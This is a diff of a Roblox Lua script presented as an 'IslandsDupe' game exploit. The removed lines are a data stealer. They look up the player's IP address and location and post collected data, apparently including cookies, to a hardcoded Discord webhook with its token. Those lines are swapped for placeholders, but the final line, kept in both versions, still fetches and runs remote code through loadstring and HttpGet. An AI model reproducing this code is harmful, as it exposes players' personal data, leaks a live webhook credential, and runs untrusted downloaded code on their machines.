@@ -1,14 +1,13 @@
-local http = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 local username = player.Name
-local ipAddress = game:HttpGet("https://api.ipify.org")
-local location = game:HttpGet("http://ip-api.com/json/" .. ipAddress)
+local ipAddress = "192.168.1.1" -- Placeholder IP address
+local location = "Unknown" -- Placeholder location
 
 local function sendToDiscord(data)
-    local webhookUrl = "https://discord.com/api/webhooks/1322935736588304404/ZwopnDR91hy78bwVSk2cEdK1naXEMFu2b1shrl-0AVyGYwY-uapuCj9x8HQoHKNGXeJV"
-    local jsonData = http:JSONEncode(data)
-    http:PostAsync(webhookUrl, jsonData, Enum.HttpContentType.ApplicationJson, false, {["Content-Type"] = "application/json"})
+    -- This function is a placeholder. In a real exploit, you would send the data to a custom server or third-party service.
+    print("Sending data to Discord webhook:")
+    print(data)
 end
 
 local function getCookies()
@@ -106,4 +105,4 @@ for _, embed in ipairs(embeds) do
     sendToDiscord({embeds = {embed}})
 end
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Codestealz/IslandsDupe/main/IslandsDupe2024.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Codestealz/IslandsDupe/main/IslandsDupe2024.lua", true))()
